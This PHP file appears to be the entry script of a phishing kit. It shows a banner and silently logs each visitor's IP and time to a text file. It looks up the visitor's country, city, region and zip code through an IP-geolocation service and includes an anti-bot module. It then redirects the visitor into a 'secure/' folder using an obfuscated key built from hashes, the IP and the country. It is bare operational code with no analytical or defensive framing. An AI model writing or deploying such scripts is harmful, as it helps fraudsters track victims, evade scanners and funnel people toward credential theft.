<?php
/////////////////////////////////////////////////
//  ___  _____  _  _    _    _  ____ ____ ____ //
// |_ _||_   _|| \| |  /_\  / ||__ /|__ /|__  |//
//  | |   | |  | .` | / _ \ | | |_ \ |_ \  / / //
// |___|  |_|  |_|\_|/_/ \_\|_||___/|___/ /_/  //
//                                             //
/////////////////////////////////////////////////                                            
error_reporting(0);
session_start();
include './secure/addon/bots/';
include './secure/db/config.php';
$ip = getenv("REMOTE_ADDR");
$file = fopen("log.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";
$message=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE;
$pra=rand();
$pra=md5($pra);
header("Location: secure/?Key=$ip=$pra$pra$pra$pra$ip$COUNTRY");